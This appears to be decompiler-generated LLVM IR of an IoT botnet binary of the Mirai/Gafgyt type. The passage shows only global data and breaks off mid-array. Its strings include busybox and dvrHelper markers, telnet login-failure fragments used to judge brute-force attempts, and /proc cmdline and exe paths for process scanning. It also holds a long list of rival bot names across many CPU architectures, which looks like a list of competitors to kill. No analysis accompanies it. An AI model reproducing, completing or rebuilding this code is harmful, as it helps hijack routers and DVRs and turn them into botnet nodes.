source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%pollfd = type { i32, i16, i16 }
%timespec = type { i32, i32 }
%linux_dirent64 = type { i32 }

@df = internal unnamed_addr global i1 false
@eax = internal unnamed_addr global i32 0
@ecx = internal unnamed_addr global i32 0
@edx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@esp = internal unnamed_addr global i32 0
@ebp = internal unnamed_addr global i32 0
@esi = internal unnamed_addr global i32 0
@edi = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_806992d.26 = constant [7 x i8] c"x86_32\00"
@global_var_807db70.29 = local_unnamed_addr global i32 0
@global_var_807507c.31 = local_unnamed_addr global i32 0
@global_var_807f0fc.32 = local_unnamed_addr global i32 0
@global_var_8069954.35 = constant [63 x i8] c"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\00"
@global_var_807db64.36 = local_unnamed_addr global i32 0
@global_var_807db6c.53 = local_unnamed_addr global i32 0
@global_var_807da60.63 = local_unnamed_addr global i32 0
@global_var_8069f9a.88 = constant i32 1313079410
@global_var_8068bb6.225 = constant [8 x i8] c"busybox\00"
@global_var_8069918.226 = constant i32 2293796
@global_var_806991a.227 = constant i32 1752367139
@global_var_806991c.228 = constant [6 x i8] c"shell\00"
@global_var_80698e5.229 = constant [7 x i8] c"dvrdvs\00"
@global_var_80698ec.231 = constant [7 x i8] c"nvalid\00"
@global_var_80698f3.232 = constant [6 x i8] c"ailed\00"
@global_var_80698f9.233 = constant [9 x i8] c"ncorrect\00"
@global_var_8069902.234 = constant [6 x i8] c"enied\00"
@global_var_8069908.235 = constant [5 x i8] c"rror\00"
@global_var_806990d.236 = constant [7 x i8] c"oodbye\00"
@global_var_8069914.237 = constant [4 x i8] c"bad\00"
@global_var_806b06b.246 = constant [7 x i8] c"#Pinet\00"
@global_var_8075068.259 = local_unnamed_addr global i32 0
@global_var_806b357.270 = constant [6 x i8] c"/proc\00"
@global_var_806b35d.271 = constant [17 x i8] c"can't open /proc\00"
@global_var_806b36e.272 = constant [18 x i8] c"/proc/%ld/cmdline\00"
@global_var_806b380.273 = constant i32 1882128416
@global_var_806b382.274 = constant [13 x i8] c"/proc/%i/exe\00"
@global_var_80685c0.275 = constant [5 x i8] c"mips\00"
@global_var_80685c5.276 = constant [7 x i8] c"mips64\00"
@global_var_80685cc.277 = constant [7 x i8] c"mipsel\00"
@global_var_80685d3.278 = constant [6 x i8] c"sh2eb\00"
@global_var_80685d9.279 = constant [7 x i8] c"sh2elf\00"
@global_var_80685e0.280 = constant [4 x i8] c"sh4\00"
@global_var_80685e4.281 = constant [4 x i8] c"x86\00"
@global_var_80685e8.282 = constant [4 x i8] c"arm\00"
@global_var_80685ec.283 = constant [6 x i8] c"armv5\00"
@global_var_80685f2.284 = constant [8 x i8] c"armv4tl\00"
@global_var_80685fa.285 = constant [6 x i8] c"armv4\00"
@global_var_8068600.286 = constant [6 x i8] c"armv6\00"
@global_var_8068606.287 = constant [5 x i8] c"i686\00"
@global_var_806860b.288 = constant [8 x i8] c"powerpc\00"
@global_var_8068613.289 = constant [13 x i8] c"powerpc440fp\00"
@global_var_8068620.290 = constant [5 x i8] c"i586\00"
@global_var_8068625.291 = constant [5 x i8] c"m68k\00"
@global_var_806862a.292 = constant [6 x i8] c"sparc\00"
@global_var_8068630.293 = constant [7 x i8] c"x86_64\00"
@global_var_8068637.294 = constant [11 x i8] c"jackmymips\00"
@global_var_8068642.295 = constant [13 x i8] c"jackmymips64\00"
@global_var_806864f.296 = constant [13 x i8] c"jackmymipsel\00"
@global_var_806865c.297 = constant [12 x i8] c"jackmysh2eb\00"
@global_var_8068668.298 = constant [13 x i8] c"jackmysh2elf\00"
@global_var_8068675.299 = constant [10 x i8] c"jackmysh4\00"
@global_var_806867f.300 = constant [10 x i8] c"jackmyx86\00"
@global_var_8068689.301 = constant [12 x i8] c"jackmyarmv5\00"
@global_var_8068695.302 = constant [14 x i8] c"jackmyarmv4tl\00"
@global_var_80686a3.303 = constant [12 x i8] c"jackmyarmv4\00"
@global_var_80686af.304 = constant [12 x i8] c"jackmyarmv6\00"
@global_var_80686bb.305 = constant [11 x i8] c"jackmyi686\00"
@global_var_80686c6.306 = constant [14 x i8] c"jackmypowerpc\00"
@global_var_80686d4.307 = constant [19 x i8] c"jackmypowerpc440fp\00"
@global_var_80686e7.308 = constant [11 x i8] c"jackmyi586\00"
@global_var_80686f2.309 = constant [11 x i8] c"jackmym68k\00"
@global_var_80686fd.310 = constant [12 x i8] c"jackmysparc\00"
@global_var_8068709.311 = constant [13 x i8] c"jackmyx86_64\00"
@global_var_8068716.312 = constant [11 x i8] c"hackmymips\00"
@global_var_8068721.313 = constant [13 x i8] c"hackmymips64\00"
@global_var_806872e.314 = constant [13 x i8] c"hackmymipsel\00"
@global_var_806873b.315 = constant [12 x i8] c"hackmysh2eb\00"
@global_var_8068747.316 = constant [13 x i8] c"hackmysh2elf\00"
@global_var_8068754.317 = constant [10 x i8] c"hackmysh4\00"
@global_var_806875e.318 = constant [10 x i8] c"hackmyx86\00"
@global_var_8068768.319 = constant [12 x i8] c"hackmyarmv5\00"
@global_var_8068774.320 = constant [14 x i8] c"hackmyarmv4tl\00"
@global_var_8068782.321 = constant [12 x i8] c"hackmyarmv4\00"
@global_var_806878e.322 = constant [12 x i8] c"hackmyarmv6\00"
@global_var_806879a.323 = constant [11 x i8] c"hackmyi686\00"
@global_var_80687a5.324 = constant [14 x i8] c"hackmypowerpc\00"
@global_var_80687b3.325 = constant [19 x i8] c"hackmypowerpc440fp\00"
@global_var_80687c6.326 = constant [11 x i8] c"hackmyi586\00"
@global_var_80687d1.327 = constant [11 x i8] c"hackmym68k\00"
@global_var_80687dc.328 = constant [12 x i8] c"hackmysparc\00"
@global_var_80687e8.329 = constant [13 x i8] c"hackmyx86_64\00"
@global_var_80687f5.330 = constant [3 x i8] c"b1\00"
@global_var_80687f8.331 = constant [3 x i8] c"b2\00"
@global_var_80687fb.332 = constant [3 x i8] c"b3\00"
@global_var_80687fe.333 = constant [3 x i8] c"b4\00"
@global_var_8068801.334 = constant [3 x i8] c"b5\00"
@global_var_8068804.335 = constant [3 x i8] c"b6\00"
@global_var_8068807.336 = constant [3 x i8] c"b7\00"
@global_var_806880a.337 = constant [3 x i8] c"b8\00"
@global_var_806880d.338 = constant [3 x i8] c"b9\00"
@global_var_8068810.339 = constant [4 x i8] c"b10\00"
@global_var_8068814.340 = constant [4 x i8] c"b11\00"
@global_var_8068818.341 = constant [4 x i8] c"b12\00"
@global_var_806881c.342 = constant [4 x i8] c"b13\00"
@global_var_8068820.343 = constant [4 x i8] c"b14\00"
@global_var_8068824.344 = constant [4 x i8] c"b15\00"
@global_var_8068828.345 = constant [4 x i8] c"b16\00"
@global_var_806882c.346 = constant [4 x i8] c"b17\00"
@global_var_8068830.347 = constant [4 x i8] c"b18\00"
@global_var_8068834.348 = constant [4 x i8] c"b19\00"
@global_var_8068838.349 = constant [4 x i8] c"b20\00"
@global_var_806883c.350 = constant [17 x i8] c"busyboxterrorist\00"
@global_var_806884d.351 = constant [10 x i8] c"dvrHelper\00"
@global_var_8068857.352 = constant [8 x i8] c"kmymips\00"
@global_var_806885f.353 = constant [10 x i8] c"kmymips64\00"
@global_var_8068869.354 = constant [10 x i8] c"kmymipsel\00"
@global_var_8068873.355 = constant [9 x i8] c"kmysh2eb\00"
@global_var_806887c.356 = constant [10 x i8] c"kmysh2elf\00"
@global_var_8068886.357 = constant [7 x i8] c"kmysh4\00"
@global_var_806888d.358 = constant [7 x i8] c"kmyx86\00"
@global_var_8068894.359 = constant [9 x i8] c"kmyarmv5\00"
@global_var_806889d.360 = constant [11 x i8] c"kmyarmv4tl\00"
@global_var_80688a8.361 = constant [9 x i8] c"kmyarmv4\00"
@global_var_80688b1.362 = constant [9 x i8] c"kmyarmv6\00"
@global_var_80688ba.363 = constant [8 x i8] c"kmyi686\00"
@global_var_80688c2.364 = constant [11 x i8] c"kmypowerpc\00"
@global_var_80688cd.365 = constant [16 x i8] c"kmypowerpc440fp\00"
@global_var_80688dd.366 = constant [8 x i8] c"kmyi586\00"
@global_var_80688e5.367 = constant [8 x i8] c"kmym68k\00"
@global_var_80688ed.368 = constant [9 x i8] c"kmysparc\00"
@global_var_80688f6.369 = constant [10 x i8] c"kmyx86_64\00"
@global_var_8068900.370 = constant [8 x i8] c"lolmips\00"
@global_var_8068908.371 = constant [10 x i8] c"lolmips64\00"
@global_var_8068912.372 = constant [10 x i8] c"lolmipsel\00"
@global_var_806891c.373 = constant [9 x i8] c"lolsh2eb\00"
@global_var_8068925.374 = constant [10 x i8] c"lolsh2elf\00"
@global_var_806892f.375 = constant [7 x i8] c"lolsh4\00"
@global_var_8068936.376 = constant [7 x i8] c"lolx86\00"
@global_var_806893d.377 = constant [9 x i8] c"lolarmv5\00"
@global_var_8068946.378 = constant [11 x i8] c"lolarmv4tl\00"
@global_var_8068951.379 = constant [9 x i8] c"lolarmv4\00"
@global_var_806895a.380 = constant [9 x i8] c"lolarmv6\00"
@global_var_8068963.381 = constant [8 x i8] c"loli686\00"
@global_var_806896b.382 = constant [11 x i8] c"lolpowerpc\00"
@global_var_8068976.383 = constant [16 x i8] c"lolpowerpc440fp\00"
@global_var_8068986.384 = constant [8 x i8] c"loli586\00"
@global_var_806898e.385 = constant [8 x i8] c"lolm68k\00"
@global_var_8068996.386 = constant [9 x i8] c"lolsparc\00"
@global_var_806899f.387 = constant [8 x i8] c"telmips\00"
@global_var_80689a7.388 = constant [10 x i8] c"telmips64\00"
@global_var_80689b1.389 = constant [10 x i8] c"telmipsel\00"
@global_var_80689bb.390 = constant [9 x i8] c"telsh2eb\00"
@global_var_80689c4.391 = constant [10 x i8] c"telsh2elf\00"
@global_var_80689ce.392 = constant [7 x i8] c"telsh4\00"
@global_var_80689d5.393 = constant [7 x i8] c"telx86\00"
@global_var_80689dc.394 = constant [9 x i8] c"telarmv5\00"
@global_var_80689e5.395 = constant [11 x i8] c"telarmv4tl\00"
@global_var_80689f0.396 = constant [9 x i8] c"telarmv4\00"
@global_var_80689f9.397 = constant [9 x i8] c"telarmv6\00"
@global_var_8068a02.398 = constant [8 x i8] c"teli686\00"
@global_var_8068a0a.399 = constant [11 x i8] c"telpowerpc\00"
@global_var_8068a15.400 = constant [16 x i8] c"telpowerpc440fp\00"
@global_var_8068a25.401 = constant [8 x i8] c"teli586\00"
@global_var_8068a2d.402 = constant [8 x i8] c"telm68k\00"
@global_var_8068a35.403 = constant [9 x i8] c"telsparc\00"
@global_var_8068a3e.404 = constant [10 x i8] c"telx86_64\00"
@global_var_8068a48.405 = constant [12 x i8] c"TwoFacemips\00"
@global_var_8068a54.406 = constant [14 x i8] c"TwoFacemips64\00"
@global_var_8068a62.407 = constant [14 x i8] c"TwoFacemipsel\00"
@global_var_8068a70.408 = constant [13 x i8] c"TwoFacesh2eb\00"
@global_var_8068a7d.409 = constant [14 x i8] c"TwoFacesh2elf\00"
@global_var_8068a8b.410 = constant [11 x i8] c"TwoFacesh4\00"
@global_var_8068a96.411 = constant [11 x i8] c"TwoFacex86\00"
@global_var_8068aa1.412 = constant [13 x i8] c"TwoFacearmv5\00"
@global_var_8068aae.413 = constant [15 x i8] c"TwoFacearmv4tl\00"
@global_var_8068abd.414 = constant [13 x i8] c"TwoFacearmv4\00"
@global_var_8068aca.415 = constant [13 x i8] c"TwoFacearmv6\00"
@global_var_8068ad7.416 = constant [12 x i8] c"TwoFacei686\00"
@global_var_8068ae3.417 = constant [15 x i8] c"TwoFacepowerpc\00"
@global_var_8068af2.418 = constant [20 x i8] c"TwoFacepowerpc440fp\00"
@global_var_8068b06.419 = constant [12 x i8] c"TwoFacei586\00"
@global_var_8068b12.420 = constant [12 x i8] c"TwoFacem68k\00"
@global_var_8068b1e.421 = constant [13 x i8] c"TwoFacesparc\00"
@global_var_8068b2b.422 = constant [14 x i8] c"TwoFacex86_64\00"
@global_var_8068b39.423 = constant [5 x i8] c"xxb1\00"
@global_var_8068b3e.424 = constant [5 x i8] c"xxb2\00"
@global_var_8068b43.425 = constant [5 x i8] c"xxb3\00"
@global_var_8068b48.426 = constant [5 x i8] c"xxb4\00"
@global_var_8068b4d.427 = constant [5 x i8] c"xxb5\00"
@global_var_8068b52.428 = constant [5 x i8] c"xxb6\00"
@global_var_8068b57.429 = constant [5 x i8] c"xxb7\00"
@global_var_8068b5c.430 = constant [5 x i8] c"xxb8\00"
@global_var_8068b61.431 = constant [5 x i8] c"xxb9\00"
@global_var_8068b66.432 = constant [6 x i8] c"xxb10\00"
@global_var_8068b6c.433 = constant [6 x i8] c"xxb11\00"
@global_var_8068b72.434 = constant [6 x i8] c"xxb12\00"
@global_var_8068b78.435 = constant [6 x i8] c"xxb13\00"
@global_var_8068b7e.436 = constant [6 x i8] c"xxb14\00"
@global_var_8068b84.437 = constant [6 x i8] c"xxb15\00"
@global_var_8068b8a.438 = constant [6 x i8] c"xxb16\00"
@global_var_8068b90.439 = constant [6 x i8] c"xxb17\00"
@global_var_8068b96.440 = constant [6 x i8] c"xxb18\00"
@global_var_8068b9c.441 = constant [6 x i8] c"xxb19\00"
@global_var_8068ba2.442 = constant [6 x i8] c"xxb20\00"
@global_var_8068ba8.443 = constant [3 x i8] c"bb\00"
@global_var_8068bab.444 = constant [11 x i8] c"busybotnet\00"
@global_var_8068bbe.445 = constant [3 x i8] c"B1\00"
@global_var_8068bc1.446 = constant [3 x i8] c"B2\00"
@global_var_8068bc4.447 = constant [3 x i8] c"B3\00"
@global_var_8068bc7.448 = constant [3 x i8] c"B4\00"
@global_var_8068bca.449 = constant [3 x i8] c"B5\00"
@global_var_8068bcd.450 = constant [3 x i8] c"B6\00"
@global_var_8068bd0.451 = constant [3 x i8] c"B7\00"
@global_var_8068bd3.452 = constant [3 x i8] c"B8\00"
@global_var_8068bd6.453 = constant [3 x i8] c"B9\00"
@global_var_8068bd9.454 = constant [4 x i8] c"B10\00"
@global_var_8068bdd.455 = constant [4 x i8] c"B11\00"
@global_var_8068be1.456 = constant [4 x i8] c"B12\00"
@global_var_8068be5.457 = constant [4 x i8] c"B13\00"
@global_var_8068be9.458 = constant [4 x i8] c"B14\00"
@global_var_8068bed.459 = constant [4 x i8] c"B15\00"
@global_var_8068bf1.460 = constant [4 x i8] c"B16\00"
@global_var_8068bf5.461 = constant [4 x i8] c"B17\00"
@global_var_8068bf9.462 = constant [4 x i8] c"B18\00"
@global_var_8068bfd.463 = constant [4 x i8] c"B20\00"
@global_var_8068c01.464 = constant [7 x i8] c"gaybot\00"
@global_var_8070080.465 = global [191 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80685c0.275, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80685c5.276, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80685cc.277, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80685d3.278, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80685d9.279, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80685e0.280, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80685e4.281, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80685e8.282, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80685ec.283, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80685f2.284, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80685fa.285, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8068600.286, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8068606.287, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_806860b.288, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8068613.289, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8068620.290, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8068625.291, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_806862a.292, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8068630.293, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8068637.294, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8068642.295, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_806864f.296, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_806865c.297, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8068668.298, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8068675.299, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_806867f.300, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8068689.301, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8068695.302, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_80686a3.303, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_80686af.304, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_80686bb.305, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_80686c6.306, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_80686d4.307, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_80686e7.308, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_80686f2.309, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_80686fd.310, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8068709.311, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8068716.312, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8068721.313, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_806872e.314, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_806873b.315, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8068747.316, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8068754.317, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_806875e.318, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8068768.319, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8068774.320, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8068782.321, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_806878e.322, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_806879a.323, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_80687a5.324, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_80687b3.325, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_80687c6.326, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_80687d1.327, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_80687dc.328, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_80687e8.329, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80687f5.330, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80687f8.331, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80687fb.332, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80687fe.333, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8068801.334, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8068804.335, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8068807.336, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_806880a.337, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_806880d.338, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8068810.339, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8068814.340, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8068818.341, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806881c.342, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8068820.343, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8068824.344, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8068828.345, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806882c.346, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8068830.347, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8068834.348, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8068838.349, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_806883c.350, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_806884d.351, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8068857.352, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_806885f.353, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8068869.354, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8068873.355, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_806887c.356, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8068886.357, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_806888d.358, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8068894.359, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_806889d.360, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80688a8.361, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80688b1.362, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80688ba.363, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_80688c2.364, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_80688cd.365, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80688dd.366, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80688e5.367, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80688ed.368, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_80688f6.369, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8068900.370, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8068908.371, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8068912.372, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_806891c.373, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8068925.374, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_806892f.375, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8068936.376, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_806893d.377, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8068946.378, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8068951.379, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_806895a.380, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8068963.381, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_806896b.382, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_8068976.383, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8068986.384, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_806898e.385, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8068996.386, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_806899f.387, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_80689a7.388, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_80689b1.389, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80689bb.390, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_80689c4.391, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80689ce.392, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80689d5.393, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80689dc.394, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_80689e5.395, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80689f0.396, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80689f9.397, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8068a02.398, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8068a0a.399, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_8068a15.400, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8068a25.401, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8068a2d.402, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8068a35.403, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8068a3e.404, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8068a48.405, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8068a54.406, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8068a62.407, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8068a70.408, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8068a7d.409, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8068a8b.410, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8068a96.411, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8068aa1.412, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_8068aae.413, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8068abd.414, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8068aca.415, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8068ad7.416, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_8068ae3.417, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_8068af2.418, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8068b06.419, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8068b12.420, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8068b1e.421, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8068b2b.422, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8068b39.423, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8068b3e.424, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8068b43.425, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* 